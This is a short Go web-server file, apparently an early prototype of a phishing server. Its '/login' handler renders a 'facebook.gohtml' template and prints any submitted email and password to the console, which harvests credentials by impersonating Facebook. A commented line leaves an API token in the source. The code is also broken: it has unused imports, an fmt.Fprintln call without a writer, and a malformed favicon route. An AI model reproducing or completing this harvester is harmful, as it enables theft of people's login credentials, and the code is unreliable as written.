package main

import (
//	"io"
	"fmt"
	"net/http"
	"html/template"

	"github.com/ipinfo/go/v2/ipinfo"
)

var tpl *template.Template
//var TimeStamp time.Time
//var ipInfoToken string = "e923235a764c48"

type visitorData struct {
	City string
	Country string
	Headers []string
	IP string
	LatLon string
	Region string
	Timezone string
//	TraceRoute string
}

func init() {
	tpl = template.Must(template.ParseGlob("templates/*"))
}

func main() {
	http.HandleFunc("/", index)
	http.HandleFunc("/beacon", beacon)
	http.HandleFunc("/login", login) // not working atm
	http.Handle("favicon.ico", http.NotFoundHandler())
	http.ListenAndServe(":6302", nil)
}

func index(w http.ResponseWriter, req *http.Request) {
fmt.Fprintln(w, "Visitor: ", req.RemoteAddr)
}

func login(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		login := req.FormValue("email")
		password := req.FormValue("pass")

		fmt.Println("Email: ", login, "Password: ", password)
	}

	tpl.ExecuteTemplate(w, "facebook.gohtml", nil)
}

func beacon(w http.ResponseWriter, req *http.Request) {
	resp, err := http.Get("https://ifconfig.me")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	fmt.Fprintln(resp)
}
